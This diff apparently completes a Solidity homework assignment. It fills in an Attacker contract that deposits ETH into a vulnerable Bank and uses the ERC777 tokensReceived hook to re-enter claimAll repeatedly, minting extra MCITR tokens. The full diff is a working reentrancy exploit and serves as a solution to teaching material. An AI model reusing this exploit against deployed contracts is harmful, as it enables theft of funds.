@@ -35,9 +35,20 @@ contract Attacker is AccessControl, IERC777Recipient {
 	   amt is the amt of ETH the attacker will deposit initially to start the attack
 	*/
 	function attack(uint256 amt) payable public {
-      require( address(bank) != address(0), "Target bank not set" );
-		//YOUR CODE TO START ATTACK GOES HERE
-	}
+    require(address(bank) != address(0), "Target bank not set");
+    require(msg.value == amt, "Must send exactly amt wei");
+
+    // reset recursion depth for a fresh attack
+    depth = 0;
+
+    // 1) deposit ETH into the vulnerable Bank
+    emit Deposit(amt);
+    bank.deposit{value: amt}();
+
+    // 2) start the vulnerable flow by claiming all MCITR
+    //    this will mint ERC777 tokens and trigger tokensReceived
+    bank.claimAll();
+}
 
 	/*
 	   After the attack, this contract has a lot of (stolen) MCITR tokens
@@ -52,15 +63,28 @@ contract Attacker is AccessControl, IERC777Recipient {
 	   This is the function that gets called when the Bank contract sends MCITR tokens
 	*/
 	function tokensReceived(
-		address operator,
-		address from,
-		address to,
-		uint256 amount,
-		bytes calldata userData,
-		bytes calldata operatorData
-	) external {
-		//YOUR CODE TO RECURSE GOES HERE
-	}
+    address operator,
+    address from,
+    address to,
+    uint256 amount,
+    bytes calldata userData,
+    bytes calldata operatorData
+) external /* override */ {
+    // Silence unused parameter warnings (optional)
+    operator; from; to; amount; userData; operatorData;
+
+    // Only respond to the MCITR token from our target bank
+    require(msg.sender == address(bank.token()), "Unexpected token");
+
+    // Re–enter claimAll() a few times to multiply the minted tokens
+    if (depth < max_depth) {
+        depth += 1;
+        emit Recurse(depth);
+
+        // Re-enter the vulnerable function
+        bank.claimAll();
+    }
+}
 
 }
 
